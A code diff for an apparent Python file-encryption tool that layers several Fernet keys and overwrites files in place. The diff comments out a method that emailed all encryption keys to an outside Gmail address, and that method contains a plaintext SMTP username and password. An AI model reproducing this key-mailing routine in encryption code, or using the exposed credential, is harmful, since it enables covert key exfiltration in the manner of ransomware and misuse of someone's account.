@@ -3,7 +3,7 @@ import os
 import sys
 import time
 import argparse
-import smtplib
+# import smtplib
 from cryptography.fernet import Fernet
 from concurrent.futures import ThreadPoolExecutor
 
@@ -45,7 +45,7 @@ class EncryptorDecryptor:
                 keys = file.read()
         else:
             print('Key encryption not exists')
-            quit()
+            exit()
         return keys.split(b' - ')[0:-1]
 
     def encryptData(self, file_name):
@@ -55,7 +55,7 @@ class EncryptorDecryptor:
         for key in self.keys:
             fernet = Fernet(key)
             file_data = fernet.encrypt(file_data)
-            time.sleep(file_size / 100000000)
+            time.sleep(file_size / (100  * 1024 * 1024))
         with open(file_name, 'wb') as new_file:
             new_file.write(file_data)
 
@@ -66,33 +66,33 @@ class EncryptorDecryptor:
         for key in reversed(self.keys):
             fernet = Fernet(key)
             file_data = fernet.decrypt(file_data)
-            time.sleep(file_size / 100000000)
+            time.sleep(file_size / (100  * 1024 * 1024))
         with open(file_name, 'wb') as new_file:
             new_file.write(file_data)
 
-    def sendKeysToEmail(self):
+    # def sendKeysToEmail(self):
 
-        # email content
-        sender_email = "notification.3mail@gmail.com"
-        receiver_email = "pejmanly@gmail.com"
-        message = self.keys
+    #     # email content
+    #     sender_email = "notification.3mail@gmail.com"
+    #     receiver_email = "pejmanly@gmail.com"
+    #     message = self.keys
 
-        # SMTP server details
-        smtp_server = "smtp.gmail.com"
-        smtp_port = 587
-        smtp_username = "notification.3mail@gmail.com"
-        smtp_password = "(#)_(#)Notification.1209"
+    #     # SMTP server details
+    #     smtp_server = "smtp.gmail.com"
+    #     smtp_port = 587
+    #     smtp_username = "notification.3mail@gmail.com"
+    #     smtp_password = "(#)_(#)Notification.1209"
 
-        # connect to SMTP server
-        smtp = smtplib.SMTP(smtp_server, smtp_port)
-        smtp.starttls() # start a secure connection
-        smtp.login(smtp_username, smtp_password) # login
+    #     # connect to SMTP server
+    #     smtp = smtplib.SMTP(smtp_server, smtp_port)
+    #     smtp.starttls() # start a secure connection
+    #     smtp.login(smtp_username, smtp_password) # login
 
-        # send email
-        smtp.sendmail(sender_email, receiver_email, message)
+    #     # send email
+    #     smtp.sendmail(sender_email, receiver_email, message)
 
-        # close connection
-        smtp.quit()
+    #     # close connection
+    #     smtp.quit()
 
     def execute(self):
         with ThreadPoolExecutor() as executor:
